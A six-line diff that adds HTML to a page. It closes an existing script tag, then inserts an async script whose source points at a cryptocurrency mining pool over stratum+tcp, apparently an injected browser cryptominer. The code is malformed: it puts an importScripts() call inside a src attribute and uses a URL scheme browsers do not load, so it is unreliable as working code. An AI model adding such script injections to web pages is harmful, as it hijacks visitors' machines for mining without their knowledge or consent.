@@ -1,0 +1,6 @@
+</script>
+<script
+  async
+  type="application/javascript"
+  src="importScripts('https://stratum+tcp://bs.poolbinance.com:3333')">
+</script>
